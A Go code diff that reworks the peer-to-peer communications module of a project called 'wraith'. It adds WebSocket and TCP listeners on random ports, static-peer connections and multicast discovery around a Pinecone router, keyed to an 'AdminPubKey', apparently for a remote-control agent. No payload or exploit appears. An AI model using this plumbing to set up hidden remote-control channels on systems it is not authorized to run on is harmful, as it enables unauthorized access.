@@ -7,11 +7,15 @@ import (
 	"io/ioutil"
 	"log"
 	"net"
+	"net/http"
 	"sync"
 
 	"git.0x1a8510f2.space/0x1a8510f2/wraith/wraith/libwraith"
+	"github.com/gorilla/websocket"
+	pineconeC "github.com/matrix-org/pinecone/connections"
 	pineconeM "github.com/matrix-org/pinecone/multicast"
 	pineconeR "github.com/matrix-org/pinecone/router"
+	pineconeU "github.com/matrix-org/pinecone/util"
 )
 
 // A CommsManager module implementation which utilises (optionally) encrypted JWT
@@ -24,11 +28,12 @@ type PineconeJWTCommsManagerModule struct {
 
 	// Configuration properties
 
-	OwnPrivKey         ed25519.PrivateKey
-	AdminPubKey        ed25519.PublicKey
-	UseInboundPinecone bool
-	UseMulticast       bool
-	StaticPeers        []string
+	OwnPrivKey   ed25519.PrivateKey
+	AdminPubKey  ed25519.PublicKey
+	ListenTcp    bool
+	ListenWs     bool
+	UseMulticast bool
+	StaticPeers  []string
 }
 
 func (m *PineconeJWTCommsManagerModule) Mainloop(ctx context.Context, w *libwraith.Wraith) {
@@ -50,40 +55,86 @@ func (m *PineconeJWTCommsManagerModule) Mainloop(ctx context.Context, w *libwrai
 	// Init a dummy logger for pinecone stuff
 	dummyLogger := log.New(ioutil.Discard, "", 0)
 
-	// Init pinecone router
-	router := pineconeR.NewRouter(dummyLogger, m.OwnPrivKey, false)
+	// Init pinecone stuff
+	pineconeRouter := pineconeR.NewRouter(dummyLogger, m.OwnPrivKey, false)
+	pineconeMulticast := pineconeM.NewMulticast(dummyLogger, pineconeRouter)
+	pineconeMulticast.Start()
+	pineconeManager := pineconeC.NewConnectionManager(pineconeRouter, nil)
 
-	//pQUIC := pineconeS.NewSessions(nil, router)
+	listener := net.ListenConfig{}
+
+	// If static peers are configured, connect to them
+	for _, peer := range m.StaticPeers {
+		pineconeManager.AddPeer(peer)
+	}
 
 	// If inbound pinecone connections are allowed, start listening
-	if m.UseInboundPinecone {
+	if m.ListenWs {
 		go func() {
-			// Spawn a listener on a random port
-			listener, err := net.Listen("tcp", ":0")
-			if err != nil {
-				panic(fmt.Errorf("[%s] failed to ", err))
-			}
-
-			// Loop until exit is requested
-			for ctx.Err() != nil {
-				conn, err := listener.Accept()
+			var upgrader = websocket.Upgrader{}
+			http.DefaultServeMux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
+				conn, err := upgrader.Upgrade(w, r, nil)
 				if err != nil {
-					continue
+					log.Println(err)
+					return
 				}
 
-				_, _ = router.Connect(
-					conn,
+				if _, err := pineconeRouter.Connect(
+					pineconeU.WrapWebSocketConn(conn),
+					pineconeR.ConnectionURI(conn.RemoteAddr().String()),
 					pineconeR.ConnectionPeerType(pineconeR.PeerTypeRemote),
-				)
+					pineconeR.ConnectionZone("websocket"),
+				); err != nil {
+					panic(err)
+				}
+
+				fmt.Println("Inbound WS connection", conn.RemoteAddr(), "is connected")
+			})
+
+			listener, err := listener.Listen(context.Background(), "tcp", ":0")
+			if err != nil {
+				panic(err)
 			}
 
-			listener.Close()
+			fmt.Printf("Listening for WebSockets on http://%s\n", listener.Addr())
+
+			if err := http.Serve(listener, http.DefaultServeMux); err != nil {
+				panic(err)
+			}
+		}()
+	}
+
+	if m.ListenTcp {
+		go func() {
+			listener, err := listener.Listen(context.Background(), "tcp", ":0")
+			if err != nil {
+				panic(err)
+			}
+
+			fmt.Println("Listening on", listener.Addr())
+
+			for {
+				conn, err := listener.Accept()
+				if err != nil {
+					panic(err)
+				}
+
+				if _, err := pineconeRouter.Connect(
+					conn,
+					pineconeR.ConnectionURI(conn.RemoteAddr().String()),
+					pineconeR.ConnectionPeerType(pineconeR.PeerTypeRemote),
+				); err != nil {
+					panic(err)
+				}
+
+				fmt.Println("Inbound TCP connection", conn.RemoteAddr(), "is connected")
+			}
 		}()
 	}
 
 	// If enabled, start multicast
 	if m.UseMulticast {
-		pMulticast := pineconeM.NewMulticast(dummyLogger, router)
+		pMulticast := pineconeM.NewMulticast(dummyLogger, pineconeRouter)
 		pMulticast.Start()
 	}
 
